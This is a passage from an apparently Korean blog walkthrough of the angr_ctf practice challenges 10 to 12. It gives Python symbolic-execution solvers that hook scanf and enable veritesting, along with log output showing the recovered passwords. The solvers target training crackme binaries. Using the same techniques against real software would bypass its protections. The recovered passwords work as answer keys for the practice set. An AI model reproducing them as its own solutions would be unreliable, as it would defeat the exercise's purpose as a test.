<span class="hljs-keyword">and</span> continuing. You can resolve this by:WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-17</span> <span class="hljs-number">12</span>:<span class="hljs-number">26</span>:<span class="hljs-number">50</span>,<span class="hljs-number">202</span> | angr.storage.memory_mixins.default_filler_mixin | <span class="hljs-number">1</span>) setting a value to the initial stateWARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-17</span> <span class="hljs-number">12</span>:<span class="hljs-number">26</span>:<span class="hljs-number">50</span>,<span class="hljs-number">202</span> | angr.storage.memory_mixins.default_filler_mixin | <span class="hljs-number">2</span>) adding the state option ZERO_FILL_UNCONSTRAINED_{MEMORY,REGISTERS}, to make unknown regions hold nullWARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-17</span> <span class="hljs-number">12</span>:<span class="hljs-number">26</span>:<span class="hljs-number">50</span>,<span class="hljs-number">202</span> | angr.storage.memory_mixins.default_filler_mixin | <span class="hljs-number">3</span>) adding the state option SYMBOL_FILL_UNCONSTRAINED_{MEMORY,REGISTERS}, to suppress these messages.WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-17</span> <span class="hljs-number">12</span>:<span class="hljs-number">26</span>:<span class="hljs-number">50</span>,<span class="hljs-number">202</span> | angr.storage.memory_mixins.default_filler_mixin | Filling register edi <span class="hljs-keyword">with</span> <span class="hljs-number">4</span> unconstrained bytes referenced <span class="hljs-keyword">from</span> <span class="hljs-number">0x804a9b1</span> (__libc_csu_init+<span class="hljs-number">0x1</span> <span class="hljs-keyword">in</span> <span class="hljs-number">10</span>_angr_simprocedures (<span class="hljs-number">0x804a9b1</span>))WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-17</span> <span class="hljs-number">12</span>:<span class="hljs-number">26</span>:<span class="hljs-number">50</span>,<span class="hljs-number">203</span> | angr.storage.memory_mixins.default_filler_mixin | Filling register ebx <span class="hljs-keyword">with</span> <span class="hljs-number">4</span> unconstrained bytes referenced <span class="hljs-keyword">from</span> <span class="hljs-number">0x804a9b3</span> (__libc_csu_init+<span class="hljs-number">0x3</span> <span class="hljs-keyword">in</span> <span class="hljs-number">10</span>_angr_simprocedures (<span class="hljs-number">0x804a9b3</span>))WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-17</span> <span class="hljs-number">12</span>:<span class="hljs-number">26</span>:<span class="hljs-number">52</span>,<span class="hljs-number">183</span> | claripy.ast.bv | BVV value <span class="hljs-keyword">is</span> being coerced <span class="hljs-keyword">from</span> a unicode string, encoding <span class="hljs-keyword">as</span> utf<span class="hljs-number">-8</span><span class="hljs-string">b&apos;MSWKNJNAVTTOZMRY&apos;</span>j0ker@angr:~/angr_ctf/dist$ ./<span class="hljs-number">10</span>_angr_simprocedures Enter the password: MSWKNJNAVTTOZMRYGood Job.</code></pre><h1 id="11-angr-sim-scanf"><a href="#11-angr-sim-scanf" class="headerlink" title="11_angr_sim_scanf"></a>11_angr_sim_scanf</h1><p><img src="/2021/08/25/j0ker/angr_part5/1.png" alt="Untitled"></p><p>&#xC774;&#xBC88;&#xC5D0;&#xB294; <code>scanf</code>&#xB97C; &#xC2DC;&#xBBAC;&#xB808;&#xC774;&#xC158;&#xD558;&#xB294; &#xBB38;&#xC81C;&#xC785;&#xB2C8;&#xB2E4;. &#xC55E;&#xC5D0; &#xBB38;&#xC81C;&#xB97C; &#xBE44;&#xC2B7;&#xD558;&#xAC8C; &#xD65C;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xB294;&#xAC70; &#xAC19;&#xB124;&#xC694;. &#xC774;&#xBC88; &#xBB38;&#xC81C;&#xC5D0;&#xC11C;&#xB294; <code>check_equals_</code> &#xD568;&#xC218;&#xAC00; &#xB098;&#xC624;&#xC9C0; &#xC54A;&#xC73C;&#xB2C8; &#xB531; <code>scanf</code>&#xB9CC; &#xC2DC;&#xBBAC;&#xB808;&#xC774;&#xC158;&#xD558;&#xBA74; &#xB420;&#xB4EF; &#xD569;&#xB2C8;&#xB2E4;.(&#xADFC;&#xB370; &#xC774;&#xAC70; &#xADF8;&#xB0E5; &#xC2EC;&#xBCFC;&#xB9AD; &#xBCC0;&#xC218; &#xB450;&#xAC1C; &#xC120;&#xC5B8;&#xD558;&#xACE0; <code>scanf</code> &#xB4A4;&#xC5D0;&#xC11C; &#xBD84;&#xC11D; &#xC2DC;&#xC791;&#xD558;&#xBA74; &#xB418;&#xB294;&#xAC70; &#xC544;&#xB2CC;&#xAC00;&#x2026;?&#xB77C;&#xB294; &#xBB38;&#xC81C; &#xCD9C;&#xC81C;&#xC790;&#xC5D0; &#xC758;&#xB3C4;&#xC5D0; &#xBC18;&#xD558;&#xB294; &#xC0DD;&#xAC01;&#xC744; &#xD574;&#xBD24;&#xC2B5;&#xB2C8;&#xB2E4; &#x314E;) &#xADF8;&#xB798;&#xB3C4; &#xC55E;&#xC5D0;&#xC11C; &#xD55C;&#xBC88; &#xD574;&#xBD24;&#xC73C;&#xB2C8; &#xC880; &#xC27D;&#xACA0;&#xB124;&#xC694;!</p><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ReplacementScanf</span>(<span class="hljs-params">angr.SimProcedure</span>):</span>  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run</span>(<span class="hljs-params">self, format_string, scanf0_address, scanf1_address</span>):</span>    scanf0 = claripy.BVS(<span class="hljs-string">&apos;scanf0&apos;</span>, <span class="hljs-number">32</span>)    scanf1 = claripy.BVS(<span class="hljs-string">&apos;scanf1&apos;</span>, <span class="hljs-number">32</span>)        self.state.memory.store(scanf0_address, scanf0, endness=project.arch.memory_endness)    self.state.memory.store(scanf1_address, scanf1, endness=project.arch.memory_endness)    self.state.globals[<span class="hljs-string">&apos;solution0&apos;</span>] = scanf0    self.state.globals[<span class="hljs-string">&apos;solution1&apos;</span>] = scanf1</code></pre><p>&#xC704; &#xBB38;&#xC81C;&#xC640; &#xB611;&#xAC19;&#xC774; &#xD074;&#xB798;&#xC2A4;&#xB97C; &#xB9CC;&#xB4E4;&#xC5B4;&#xC8FC;&#xACE0; &#xC2EC;&#xBCFC;&#xB9AD; &#xBCC0;&#xC218; &#xB450;&#xAC1C;&#xB97C; &#xC9C0;&#xC815;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;. &#xC5EC;&#xAE30;&#xC5D0;&#xC11C; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xC2EC;&#xBCFC;&#xB9AD; &#xBCC0;&#xC218;&#xB97C; &#xC800;&#xC7A5;&#xD560; &#xB54C; <code>endness</code>&#xB77C;&#xB294; &#xC778;&#xC790;&#xAC00; &#xD558;&#xB098; &#xB354; &#xB4E4;&#xC5B4;&#xAC00;&#xB294;&#xB370;, &#xC774;&#xB294; &#xC5D4;&#xB514;&#xC548;&#xC744; &#xC9C0;&#xC815;&#xD558;&#xB294; &#xC778;&#xC790;&#xC785;&#xB2C8;&#xB2E4;. <code>memory_endness</code>&#xB294; &#xD604;&#xC7AC; &#xC9C0;&#xAE08; &#xBD84;&#xC11D;&#xD558;&#xB294; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xC5D4;&#xB514;&#xC548;&#xC744; &#xC0AC;&#xC6A9;&#xD55C;&#xB2E4;&#xB294; &#xC758;&#xBBF8;&#xC785;&#xB2C8;&#xB2E4;. &#xC5EC;&#xAE30;&#xC5D0;&#xC11C;&#xB294; &#xB9AC;&#xD2C0; &#xC5D4;&#xB514;&#xC548;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xACA0;&#xC8E0;. &#xADF8; &#xC678;&#xC5D0;&#xB3C4; <code>archinfo</code>&#xB97C; <code>import</code>&#xD558;&#xACE0; <code>archinfo.arch.Endness</code>&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xBA74; &#xC9C1;&#xC811; &#xC5D4;&#xB514;&#xC548;&#xC744; &#xC124;&#xC815;&#xD574;&#xC904; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python">archinfo.arch.Endness.LE : &#xB9AC;&#xD2C0;&#xC5D4;&#xB514;&#xC548;archinfo.arch.Endness.BE : &#xBE45;&#xC5D4;&#xB514;&#xC548;archinfo.arch.Endness.BE : &#xBBF8;&#xB4E4;&#xC5D4;&#xB514;&#xC548;</code></pre><p>&#xADF8;&#xB9AC;&#xACE0; &#xAC01;&#xAC01; <code>buffer0</code>, <code>buffer1</code>&#xC758; &#xC8FC;&#xC18C;&#xC5D0; &#xC800;&#xC7A5;&#xD55C; &#xB2E4;&#xC74C; <code>globals</code>&#xB77C;&#xB294; &#xB515;&#xC154;&#xB108;&#xB9AC;&#xC5D0; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;. <a href="https://docs.angr.io/extending-angr/simprocedures">angr &#xACF5;&#xC2DD; &#xBB38;&#xC11C;</a>&#xC5D0; &#xB530;&#xB974;&#xBA74; <code>state.globals</code>&#xC5D0;&#xB294; &#xD574;&#xB2F9; <code>state</code>&#xC758; &#xBD84;&#xC11D;&#xC5D0; &#xD544;&#xC694;&#xD55C; &#xC815;&#xBCF4;&#xB4E4;&#xC774; &#xC800;&#xC7A5;&#xB418;&#xC5B4; &#xC788;&#xB2E4;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;. &#xBB54;&#xAC00; &#xC124;&#xBA85;&#xC5D0;&#xC11C;&#xB294; &#xC81C;&#xB300;&#xB85C; &#xC54C;&#xC9C0; &#xC54A;&#xC73C;&#xBA74; &#xC548;&#xC5D0; &#xC788;&#xB294; &#xB0B4;&#xC6A9;&#xC744; &#xC808;&#xB300; &#xAC74;&#xB4DC;&#xB9AC;&#xC9C0; &#xB9D0;&#xB77C;&#xAE38;&#xB798;(&#xB610; &#xC774;&#xB7F0;&#xAC70; &#xBCF4;&#xBA74; &#xAC74;&#xB4DC;&#xB824;&#xBCF4;&#xACE0; &#xC2F6;&#xC796;&#xC544;?) &#xBB50;&#xAC00; &#xC788;&#xB294;&#xC9C0;&#xB9CC; &#xBD24;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7F0;&#xB370;&#x2026;</p><pre><code class="hljs python">{<span class="hljs-string">&apos;state&apos;</span>: <span class="hljs-literal">None</span>, <span class="hljs-string">&apos;_backer&apos;</span>: {<span class="hljs-string">&apos;solution0&apos;</span>: &lt;BV32 scanf0_9_32&gt;, <span class="hljs-string">&apos;solution1&apos;</span>: &lt;BV32 scanf1_10_32&gt;}}</code></pre><p>???? &#xBB50;&#xAC00; &#xC5C6;&#xB294;&#xB370;???</p><p>&#xC554;&#xD2BC; &#xC704;&#xCC98;&#xB7FC; &#xC778;&#xD48B; &#xBC1B;&#xB294; &#xB0B4;&#xC6A9;&#xC744; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xC368;&#xC8FC;&#xAE30;&#xB9CC; &#xD558;&#xBA74; &#xC55E;&#xC5D0; &#xBB38;&#xC81C;&#xC640; &#xD06C;&#xAC8C; &#xB2E4;&#xB97C;&#xAC70; &#xC5C6;&#xC774; &#xBB38;&#xC81C;&#xB97C; &#xD480; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="sol11-py"><a href="#sol11-py" class="headerlink" title="sol11.py"></a>sol11.py</h2><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<span class="hljs-keyword">import</span> claripy<span class="hljs-keyword">import</span> sys<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>(<span class="hljs-params">argv</span>):</span>  path_to_binary = argv[<span class="hljs-number">1</span>]  project = angr.Project(path_to_binary)  initial_state = project.factory.entry_state()  <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ReplacementScanf</span>(<span class="hljs-params">angr.SimProcedure</span>):</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run</span>(<span class="hljs-params">self, format_string, scanf0_address, scanf1_address</span>):</span>      scanf0 = claripy.BVS(<span class="hljs-string">&apos;scanf0&apos;</span>, <span class="hljs-number">32</span>)      scanf1 = claripy.BVS(<span class="hljs-string">&apos;scanf1&apos;</span>, <span class="hljs-number">32</span>)            self.state.memory.store(scanf0_address, scanf0, endness=project.arch.memory_endness)      self.state.memory.store(scanf1_address, scanf1, endness=project.arch.memory_endness)      self.state.globals[<span class="hljs-string">&apos;solution0&apos;</span>] = scanf0      self.state.globals[<span class="hljs-string">&apos;solution1&apos;</span>] = scanf1  scanf_symbol = <span class="hljs-string">&apos;__isoc99_scanf&apos;</span>  project.hook_symbol(scanf_symbol, ReplacementScanf())  simulation = project.factory.simgr(initial_state)  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">is_successful</span>(<span class="hljs-params">state</span>):</span>    stdout_output = state.posix.dumps(sys.stdout.fileno())    <span class="hljs-keyword">return</span> (<span class="hljs-string">&apos;Good Job&apos;</span> <span class="hljs-keyword">in</span> stdout_output.decode(<span class="hljs-string">&apos;ascii&apos;</span>))  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">should_abort</span>(<span class="hljs-params">state</span>):</span>    stdout_output = state.posix.dumps(sys.stdout.fileno())    <span class="hljs-keyword">return</span> (<span class="hljs-string">&apos;Try again&apos;</span> <span class="hljs-keyword">in</span> stdout_output.decode(<span class="hljs-string">&apos;ascii&apos;</span>))  simulation.explore(find=is_successful, avoid=should_abort)  <span class="hljs-keyword">if</span> simulation.found:    solution_state = simulation.found[<span class="hljs-number">0</span>]    stored_solutions0 = solution_state.globals[<span class="hljs-string">&apos;solution0&apos;</span>]    stored_solutions1 = solution_state.globals[<span class="hljs-string">&apos;solution1&apos;</span>]    print(solution_state.se.eval(stored_solutions0, cast_to=int))    print(solution_state.se.eval(stored_solutions1, cast_to=int))  <span class="hljs-keyword">else</span>:    <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&apos;Could not find the solution&apos;</span>)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&apos;__main__&apos;</span>:  main(sys.argv)</code></pre><pre><code class="hljs python">j0ker@angr:~/angr_ctf/dist$ python3 sol11.py <span class="hljs-number">11</span>_angr_sim_scanf WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-17</span> <span class="hljs-number">13</span>:<span class="hljs-number">11</span>:<span class="hljs-number">58</span>,<span class="hljs-number">888</span> | angr.project | Address <span class="hljs-keyword">is</span> already hooked, during hook(<span class="hljs-number">0x8154e80</span>, &lt;SimProcedure ReplacementScanf&gt;). Re-hooking.WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-17</span> <span class="hljs-number">13</span>:<span class="hljs-number">11</span>:<span class="hljs-number">58</span>,<span class="hljs-number">967</span> | angr.storage.memory_mixins.default_filler_mixin | The program <span class="hljs-keyword">is</span> accessing memory <span class="hljs-keyword">or</span> registers <span class="hljs-keyword">with</span> an unspecified value. This could indicate unwanted behavior.WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-17</span> <span class="hljs-number">13</span>:<span class="hljs-number">11</span>:<span class="hljs-number">58</span>,<span class="hljs-number">967</span> | angr.storage.memory_mixins.default_filler_mixin | angr will cope <span class="hljs-keyword">with</span> this by generating an unconstrained symbolic variable <span class="hljs-keyword">and</span> continuing. You can resolve this by:WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-17</span> <span class="hljs-number">13</span>:<span class="hljs-number">11</span>:<span class="hljs-number">58</span>,<span class="hljs-number">967</span> | angr.storage.memory_mixins.default_filler_mixin | <span class="hljs-number">1</span>) setting a value to the initial stateWARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-17</span> <span class="hljs-number">13</span>:<span class="hljs-number">11</span>:<span class="hljs-number">58</span>,<span class="hljs-number">967</span> | angr.storage.memory_mixins.default_filler_mixin | <span class="hljs-number">2</span>) adding the state option ZERO_FILL_UNCONSTRAINED_{MEMORY,REGISTERS}, to make unknown regions hold nullWARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-17</span> <span class="hljs-number">13</span>:<span class="hljs-number">11</span>:<span class="hljs-number">58</span>,<span class="hljs-number">967</span> | angr.storage.memory_mixins.default_filler_mixin | <span class="hljs-number">3</span>) adding the state option SYMBOL_FILL_UNCONSTRAINED_{MEMORY,REGISTERS}, to suppress these messages.WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-17</span> <span class="hljs-number">13</span>:<span class="hljs-number">11</span>:<span class="hljs-number">58</span>,<span class="hljs-number">967</span> | angr.storage.memory_mixins.default_filler_mixin | Filling register edi <span class="hljs-keyword">with</span> <span class="hljs-number">4</span> unconstrained bytes referenced <span class="hljs-keyword">from</span> <span class="hljs-number">0x804fcd1</span> (__libc_csu_init+<span class="hljs-number">0x1</span> <span class="hljs-keyword">in</span> <span class="hljs-number">11</span>_angr_sim_scanf (<span class="hljs-number">0x804fcd1</span>))WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-17</span> <span class="hljs-number">13</span>:<span class="hljs-number">11</span>:<span class="hljs-number">58</span>,<span class="hljs-number">968</span> | angr.storage.memory_mixins.default_filler_mixin | Filling register ebx <span class="hljs-keyword">with</span> <span class="hljs-number">4</span> unconstrained bytes referenced <span class="hljs-keyword">from</span> <span class="hljs-number">0x804fcd3</span> (__libc_csu_init+<span class="hljs-number">0x3</span> <span class="hljs-keyword">in</span> <span class="hljs-number">11</span>_angr_sim_scanf (<span class="hljs-number">0x804fcd3</span>))WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-17</span> <span class="hljs-number">13</span>:<span class="hljs-number">11</span>:<span class="hljs-number">59</span>,<span class="hljs-number">214</span> | angr.storage.memory_mixins.default_filler_mixin | Filling memory at <span class="hljs-number">0x7ffeff60</span> <span class="hljs-keyword">with</span> <span class="hljs-number">4</span> unconstrained bytes referenced <span class="hljs-keyword">from</span> <span class="hljs-number">0x818a520</span> (strncmp+<span class="hljs-number">0x0</span> <span class="hljs-keyword">in</span> libc.so<span class="hljs-number">.6</span> (<span class="hljs-number">0x8a520</span>))CRITICAL | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-17</span> <span class="hljs-number">13</span>:<span class="hljs-number">11</span>:<span class="hljs-number">59</span>,<span class="hljs-number">470</span> | angr.sim_state | The name state.se <span class="hljs-keyword">is</span> deprecated; please use state.solver.<span class="hljs-number">1448564819</span><span class="hljs-number">1398294103</span>j0ker@angr:~/angr_ctf/dist$ ./<span class="hljs-number">11</span>_angr_sim_scanf Enter the password: <span class="hljs-number">1448564819</span> <span class="hljs-number">1398294103</span>Good Job.</code></pre><h1 id="12-angr-veritesting"><a href="#12-angr-veritesting" class="headerlink" title="12_angr_veritesting"></a>12_angr_veritesting</h1><p><code>veritesting</code>&#xC774; &#xBB50;&#xC9C0;&#x2026; &#xBAB0;&#xB77C;&#xC11C; &#xC77C;&#xB2E8; &#xAC80;&#xC0C9;&#xC744; &#xD574;&#xBD24;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/08/25/j0ker/angr_part5/2.png" alt="Untitled"></p><p>&#xB17C;&#xBB38;&#xC774;&#xB77C;&#xB2C8;&#x2026; &#xB044;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xBD05;&#xC2DC;&#xB2E4;.</p><p><img src="/2021/08/25/j0ker/angr_part5/3.png" alt="Untitled"></p><p>&#xD760; &#xBB54;&#xAC00; &#xBCC0;&#xC218;&#xAC00; &#xB9CE;&#xACE0; <code>scanf</code>&#xC5D0; &#xC778;&#xC790;&#xAC00; &#xB9CE;&#xC740;&#xAC8C; &#xC880; &#xC774;&#xC0C1;&#xD558;&#xAD70;&#xC694;. &#xADFC;&#xB370; <code>scanf</code>&#xB85C;&#xB294; 32&#xBC14;&#xC774;&#xD2B8; &#xBB38;&#xC790;&#xC5F4; &#xBC16;&#xC5D0; &#xC548; &#xBC1B;&#xB294;&#xB370; &#xB9D0;&#xC774;&#xC9C0;&#x2026; &#xD06C;&#xAC8C; &#xBB50;&#xAC00; &#xC5C6;&#xB294;&#xAC70; &#xAC19;&#xC544;&#xC11C; &#xC61B;&#xB0A0;&#xCF54;&#xB4DC;&#xB97C; &#xC0B4;&#xC9DD;&#xB9CC; &#xBC14;&#xAFD4;&#xC11C; &#xD574;&#xBD24;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python">j0ker@angr:~/angr_ctf/dist$ python3 sol12.py <span class="hljs-number">12</span>_angr_veritesting WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-17</span> <span class="hljs-number">13</span>:<span class="hljs-number">35</span>:<span class="hljs-number">56</span>,<span class="hljs-number">774</span> | angr.storage.memory_mixins.default_filler_mixin | The program <span class="hljs-keyword">is</span> accessing memory <span class="hljs-keyword">or</span> registers <span class="hljs-keyword">with</span> an unspecified value. This could indicate unwanted behavior.WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-17</span> <span class="hljs-number">13</span>:<span class="hljs-number">35</span>:<span class="hljs-number">56</span>,<span class="hljs-number">775</span> | angr.storage.memory_mixins.default_filler_mixin | angr will cope <span class="hljs-keyword">with</span> this by generating an unconstrained symbolic variable <span class="hljs-keyword">and</span> continuing. You can resolve this by:WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-17</span> <span class="hljs-number">13</span>:<span class="hljs-number">35</span>:<span class="hljs-number">56</span>,<span class="hljs-number">775</span> | angr.storage.memory_mixins.default_filler_mixin | <span class="hljs-number">1</span>) setting a value to the initial stateWARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-17</span> <span class="hljs-number">13</span>:<span class="hljs-number">35</span>:<span class="hljs-number">56</span>,<span class="hljs-number">775</span> | angr.storage.memory_mixins.default_filler_mixin | <span class="hljs-number">2</span>) adding the state option ZERO_FILL_UNCONSTRAINED_{MEMORY,REGISTERS}, to make unknown regions hold nullWARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-17</span> <span class="hljs-number">13</span>:<span class="hljs-number">35</span>:<span class="hljs-number">56</span>,<span class="hljs-number">775</span> | angr.storage.memory_mixins.default_filler_mixin | <span class="hljs-number">3</span>) adding the state option SYMBOL_FILL_UNCONSTRAINED_{MEMORY,REGISTERS}, to suppress these messages.WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-17</span> <span class="hljs-number">13</span>:<span class="hljs-number">35</span>:<span class="hljs-number">56</span>,<span class="hljs-number">775</span> | angr.storage.memory_mixins.default_filler_mixin | Filling register edi <span class="hljs-keyword">with</span> <span class="hljs-number">4</span> unconstrained bytes referenced <span class="hljs-keyword">from</span> <span class="hljs-number">0x80486c1</span> (__libc_csu_init+<span class="hljs-number">0x1</span> <span class="hljs-keyword">in</span> <span class="hljs-number">12</span>_angr_veritesting (<span class="hljs-number">0x80486c1</span>))WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-17</span> <span class="hljs-number">13</span>:<span class="hljs-number">35</span>:<span class="hljs-number">56</span>,<span class="hljs-number">776</span> | angr.storage.memory_mixins.default_filler_mixin | Filling register ebx <span class="hljs-keyword">with</span> <span class="hljs-number">4</span> unconstrained bytes referenced <span class="hljs-keyword">from</span> <span class="hljs-number">0x80486c3</span> (__libc_csu_init+<span class="hljs-number">0x3</span> <span class="hljs-keyword">in</span> <span class="hljs-number">12</span>_angr_veritesting (<span class="hljs-number">0x80486c3</span>))</code></pre><p>&#xADFC;&#xB370; &#xC880; &#xAE30;&#xB2E4;&#xB824;&#xB3C4; &#xD480;&#xB9AC;&#xC9C0;&#xAC00; &#xC54A;&#xB2E4;&#xB77C;&#xACE0;&#xC694;. &#xCD9C;&#xC81C;&#xC790;&#xC758; &#xC758;&#xB3C4;&#xB97C; &#xBAA8;&#xB974;&#xACA0;&#xC73C;&#xB2C8; &#xBB38;&#xC81C; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xBD05;&#xC2DC;&#xB2E4;.</p><pre><code class="hljs python"><span class="hljs-comment"># When you construct a simulation manager, you will want to enable Veritesting:</span><span class="hljs-comment"># project.factory.simgr(initial_state, veritesting=True)</span><span class="hljs-comment"># Hint: use one of the first few levels&apos; solutions as a reference.</span></code></pre><p>&#xD558;&#x2026; &#xCF54;&#xB4DC;&#xB3C4; &#xC5C6;&#xACE0; &#xB2EC;&#xB791; &#xC138; &#xC904;&#xC774;&#xB77C;&#xB2C8;&#x2026; &#xC554;&#xD2BC; &#xC55E;&#xC5D0; &#xBB38;&#xC81C;&#xB4E4;&#xC5D0; &#xC788;&#xB294; &#xCF54;&#xB4DC;&#xC5D0; &#xC778;&#xC790;&#xD558;&#xB098;&#xB9CC; &#xBC14;&#xAFD4;&#xC8FC;&#xBA74; &#xB418;&#xB294;&#xB4EF; &#xD569;&#xB2C8;&#xB2E4;. &#xC544;&#xB2C8; &#xADF8;&#xB798;&#xC11C; <code>veritesting</code>&#xC774; &#xBB54;&#xB370;?? &#xC5ED;&#xC2DC; &#xC77C;&#xB2E8; &#xACF5;&#xC2DD; &#xBB38;&#xC11C;&#xBD80;&#xD130; &#xCC3E;&#xC544;&#xBD24;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/08/25/j0ker/angr_part5/4.png" alt="Untitled"></p><p>&#xD558;&#x2026; &#xACB0;&#xAD6D; &#xADF8; &#xB17C;&#xBB38;&#xC774;&#xAD70;&#xC694;&#x2026; &#x3160;&#x3160; &#xB17C;&#xBB38;&#xC740; &#xD53C;&#xD558;&#xB824;&#xACE0; &#xD588;&#xB294;&#xB370;&#x2026;</p><p>&#xB124;&#x2026; &#xC774; &#xBD80;&#xBD84;&#xC740; &#xB2F4;&#xC5D0; &#xC81C;&#xAC00; &#xC77D;&#xACE0; &#xC815;&#xB9AC;&#xD574;&#xC11C; &#xC62C;&#xB9AC;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;&#x2026; &#xD5C8;&#xD5C8; &#xD6C4;&#xD0B9; &#xB3D9;&#xC791;&#xC6D0;&#xB9AC;&#xB3C4; &#xD574;&#xC57C;&#xD558;&#xB294;&#xB370; &#xB354; &#xD574;&#xC57C;&#xD560; &#xB0B4;&#xC6A9;&#xB9CC; &#xB9CE;&#xC544;&#xC9C0;&#xB294; &#xB290;&#xB08C;&#xC774;&#xB784;&#xAE4C;&#x2026;(&#xC774;&#xC655; &#xC774;&#xB807;&#xAC8C; &#xB418;&#xB294;&#xAE40;&#xC5D0; &#xC2DC;&#xB9AC;&#xC988; 10&#xD3B8;&#xAE4C;&#xC9C0; &#xCC0D;&#xC5B4;&#xBD10;?!)</p><h2 id="sol12-py"><a href="#sol12-py" class="headerlink" title="sol12.py"></a>sol12.py</h2><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<span class="hljs-keyword">import</span> sys<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>(<span class="hljs-params">argv</span>):</span>proj = angr.Project(argv[<span class="hljs-number">1</span>])initial_state = proj.factory.entry_state()simulation = proj.factory.simgr(initial_state, veritesting=<span class="hljs-literal">True</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">find</span>(<span class="hljs-params">state</span>):</span>stdout_output = state.posix.dumps(sys.stdout.fileno())<span class="hljs-keyword">return</span> (<span class="hljs-string">&quot;Good Job&quot;</span> <span class="hljs-keyword">in</span> stdout_output.decode(<span class="hljs-string">&apos;ascii&apos;</span>))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">abort</span>(<span class="hljs-params">state</span>):</span>stdout_output = state.posix.dumps(sys.stdout.fileno())<span class="hljs-keyword">return</span> (<span class="hljs-string">&quot;Try again&quot;</span> <span class="hljs-keyword">in</span> stdout_output.decode(<span class="hljs-string">&apos;ascii&apos;</span>))simulation.explore(find=find, avoid=abort)<span class="hljs-keyword">if</span> simulation.found:solution_state = simulation.found[<span class="hljs-number">0</span>]soltion = solution_state.posix.dumps(sys.stdin.fileno())print(soltion)<span class="hljs-keyword">else</span>:<span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&apos;Nonononono&apos;</span>)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&apos;__main__&apos;</span>:main(sys.argv)</code></pre><pre><code class="hljs python">j0ker@angr:~/angr_ctf/dist$ python3 sol12.py <span class="hljs-number">12</span>_angr_veritesting WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-17</span> <span class="hljs-number">13</span>:<span class="hljs-number">39</span>:<span class="hljs-number">00</span>,<span class="hljs-number">061</span> | angr.storage.memory_mixins.default_filler_mixin | The program <span class="hljs-keyword">is</span> accessing memory <span class="hljs-keyword">or</span> registers <span class="hljs-keyword">with</span> an unspecified value. This could indicate unwanted behavior.WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-17</span> <span class="hljs-number">13</span>:<span class="hljs-number">39</span>:<span class="hljs-number">00</span>,<span class="hljs-number">061</span> | angr.storage.memory_mixins.default_filler_mixin | angr 